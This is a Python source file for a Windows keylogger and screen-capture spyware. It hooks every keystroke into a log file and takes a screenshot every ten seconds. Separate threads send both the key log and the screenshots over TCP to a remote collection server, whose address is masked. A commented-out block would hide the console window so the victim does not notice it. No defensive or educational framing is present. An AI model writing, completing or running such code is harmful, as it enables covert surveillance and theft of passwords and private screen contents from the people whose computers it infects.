import pyHook
#pyxhook = '/home/yash/***/pyxhook/pyxhook/pyxhook.py'
import pythoncom
import sys
import logging
from threading import Thread
import socket
import os
#sys.path.append(os.path.dirname(os.path.expanduser(pyxhook)))
#import pyxhook
import pyautogui
import time
import win32gui, win32con

def keyboard():
	file = 'output.txt'
	f = open(file, "w+")

	def OnKeyboardEvent(event):
	    logging.basicConfig(filename=file, level=logging.DEBUG, format='%(message)s')
	    logging.log(10,chr(event.Ascii))
	    return True
	hooks_manager = pyHook.HookManager()
        #hooks_manager = pyxhook.HookManager()
	hooks_manager.KeyDown = OnKeyboardEvent
	hooks_manager.HookKeyboard()
	pythoncom.PumpMessages()

def sendKeyLog():
	while True:
		client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client_socket.connect(("xxx.xxx.xx.xx", xxxx))

		client_socket.send("txt".encode())

		txt = open('output.txt', 'rb')
		while True:
			data = txt.readline(4)
			if not data: 
				break
			client_socket.send(data)
		# print("log sent")
		txt.close()
		client_socket.close()
		time.sleep(10)

def screenshot():
	i = 1
	while True:
		client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client_socket.connect(("xxx.xxx.xx.xx", xxxxx))

		client_socket.send("png".encode())
		
		screenshot = pyautogui.screenshot()
		screenshot.save('screenshot.png')
		image = open('screenshot.png', 'rb')

		while True:
		    data = image.readline(4096)
		    if not data:
		    	break
		    client_socket.send(data)
		image.close()
		client_socket.close()

		os.remove('screenshot.png')
		time.sleep(10)
		i+=1
	exit()

if __name__ == "__main__":
        # Hiding CMD
	# hide = win32gui.GetForegroundWindow()
	# win32gui.ShowWindow(hide , win32con.SW_HIDE)

	thread = Thread(target = keyboard)
	thread2 = Thread(target = screenshot)
	thread3 = Thread(target = sendKeyLog)
	thread.start()
	thread2.start()
	thread3.start()
